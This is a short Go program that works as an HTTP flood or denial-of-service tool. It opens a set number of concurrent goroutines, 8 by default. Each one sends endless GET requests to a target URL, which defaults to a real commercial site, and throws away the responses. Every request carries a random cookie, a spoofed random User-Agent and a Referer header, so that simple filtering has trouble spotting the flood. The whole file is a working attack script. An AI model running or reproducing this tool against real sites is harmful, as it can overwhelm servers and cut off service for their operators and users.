package main

import (
	"flag"
	"github.com/EDDYCJY/fake-useragent"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"sync"
)

const (
	letterIdxBits = 6
	letterIdxMask = 1<<letterIdxBits - 1
	letterIdxMax  = 63 / letterIdxBits
)

const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

func RandStringBytesMaskImpr(n int) string {
	b := make([]byte, n)
	for i, cache, remain := n-1, rand.Int63(), letterIdxMax; i >= 0; {
		if remain == 0 {
			cache, remain = rand.Int63(), letterIdxMax
		}
		if idx := int(cache & letterIdxMask); idx < len(letterBytes) {
			b[i] = letterBytes[idx]
			i--
		}
		cache >>= letterIdxBits
		remain--
	}
	return string(b)
}

func goFun(Url string,Referer string, wg *sync.WaitGroup){
	for true {
		client := &http.Client{}
		request, err1 := http.NewRequest("GET", Url, nil)
		if err1 != nil {
			continue
		}
		if len(Referer) == 0 {
			Referer = Url;
		}
		request.Header.Add("Cookie", RandStringBytesMaskImpr(12))
		request.Header.Add("User-Agent", browser.Random())
		request.Header.Add("Referer", Referer)
		resp, err2 := client.Do(request)
		if err2 !=nil{
			continue
		}
		_,err3 :=io.Copy(ioutil.Discard,resp.Body);
		if err3 !=nil{
			continue
		}
	}
	wg.Done();
}

var count = flag.Int("c",8,"cocurrent thread for download");
var url = flag.String("s","https://baidu.com","target url")
var referer = flag.String("r","","referer url")

func main(){
	flag.Parse()
	var waitgroup sync.WaitGroup
	if(*count<=0){
		*count = 8
	}
	for i:=0; i<*count;i++ {
		waitgroup.Add(1)
		go goFun(*url,*referer,&waitgroup)
	}
	waitgroup.Wait()
}
